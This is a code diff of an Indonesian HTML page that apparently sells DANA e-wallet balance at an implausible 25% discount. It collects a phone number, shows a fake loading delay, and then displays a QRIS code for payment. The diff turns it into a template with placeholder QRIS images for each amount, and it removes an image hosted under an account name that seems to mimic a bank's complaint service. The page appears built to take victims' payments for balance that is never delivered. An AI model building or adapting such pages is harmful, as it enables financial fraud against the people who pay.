@@ -109,7 +109,7 @@
             display: none;
             position: fixed;
             top: 50%;
-            left: 44%;
+            left: 50%;
             transform: translate(-50%, -50%);
             z-index: 1000;
         }
@@ -150,24 +150,52 @@
         <input type="tel" id="phoneNumber" placeholder="Masukan Nomor HP">
     </div>
     <div class="options">
-        <div class="option" onclick="selectOption(this)">DANA 1000<span>Rp 1.000</span></div>
-        <div class="option" onclick="selectOption(this)">DANA 2000<span>Rp 2.000</span></div>
-        <div class="option" onclick="selectOption(this)">DANA 3000<span>Rp 3.000</span></div>
-        <div class="option" onclick="selectOption(this)">DANA 4000<span>Rp 4.000</span></div>
-        <div class="option" onclick="selectOption(this)">DANA 5000<span>Rp 5.000</span></div>
-        <div class="option" onclick="selectOption(this)">DANA 10.000<span>Rp 10.000</span></div>
-        <div class="option" onclick="selectOption(this)">DANA 20.000<span>Rp 20.000</span></div>
-        <div class="option" onclick="selectOption(this)">DANA 25.000<span>Rp 25.000</span></div>
-        <div class="option" onclick="selectOption(this)">DANA 50.000<span>Rp 50.000</span></div>
-        <div class="option" onclick="selectOption(this)">DANA 75.000<span>Rp 75.000</span></div>
+        <div class="option" data-qris="qris1" onclick="selectOption(this)">DANA 100.000<span>Rp 75.000</span></div>
+        <div class="option" data-qris="qris2" onclick="selectOption(this)">DANA 200.000<span>Rp 150.000</span></div>
+        <div class="option" data-qris="qris3" onclick="selectOption(this)">DANA 300.000<span>Rp 225.000</span></div>
+        <div class="option" data-qris="qris4" onclick="selectOption(this)">DANA 500.000<span>Rp 375.000</span></div>
+        <div class="option" data-qris="qris5" onclick="selectOption(this)">DANA 700.000<span>Rp 525.000</span></div>
+        <div class="option" data-qris="qris6" onclick="selectOption(this)">DANA 1,000.000<span>Rp 750.000</span></div>
     </div>
     <div class="submit-button">
         <button onclick="submitForm()">Lanjut</button>
     </div>
     <div class="loader" id="loader"></div>
-    <div class="qris-box" id="qrisBox">
+    
+    <!-- QRIS Box 1 -->
+    <div class="qris-box" id="qris1">
         <h3>Silakan Scan QRIS untuk pembayaran</h3>
-        <img src="https://raw.githubusercontent.com/Peng4duanBrimo/Peng4duanBrimo.github.io/main/qris-yayasan-bakti-kamajaya-pf.jpg" alt="QRIS">
+        <img src="folder_anda/qris1.jpg" alt="QRIS 1">
+    </div>
+    
+    <!-- QRIS Box 2 -->
+    <div class="qris-box" id="qris2">
+        <h3>Silakan Scan QRIS untuk pembayaran</h3>
+        <img src="folder_anda/qris2.jpg" alt="QRIS 2">
+    </div>
+
+    <!-- QRIS Box 3 -->
+    <div class="qris-box" id="qris3">
+        <h3>Silakan Scan QRIS untuk pembayaran</h3>
+        <img src="folder_anda/qris3.jpg" alt="QRIS 3">
+    </div>
+    
+    <!-- QRIS Box 4 -->
+    <div class="qris-box" id="qris4">
+        <h3>Silakan Scan QRIS untuk pembayaran</h3>
+        <img src="folder_anda/qris4.jpg" alt="QRIS 4">
+    </div>
+
+    <!-- QRIS Box 5 -->
+    <div class="qris-box" id="qris5">
+        <h3>Silakan Scan QRIS untuk pembayaran</h3>
+        <img src="folder_anda/qris5.jpg" alt="QRIS 5">
+    </div>
+
+    <!-- QRIS Box 6 -->
+    <div class="qris-box" id="qris6">
+        <h3>Silakan Scan QRIS untuk pembayaran</h3>
+        <img src="folder_anda/qris6.jpg" alt="QRIS 6">
     </div>
 </div>
 
@@ -188,7 +216,14 @@
             document.getElementById('loader').style.display = 'block';
             setTimeout(() => {
                 document.getElementById('loader').style.display = 'none';
-                document.getElementById('qrisBox').style.display = 'block';
+
+                // Hide all QRIS boxes
+                const allQrisBoxes = document.querySelectorAll('.qris-box');
+                allQrisBoxes.forEach(box => box.style.display = 'none');
+
+                // Show the selected QRIS box
+                const selectedQris = selectedOption.getAttribute('data-qris');
+                document.getElementById(selectedQris).style.display = 'block';
             }, 3000);
         } else {
             alert('Harap masukkan nomor HP dan pilih nominal!');
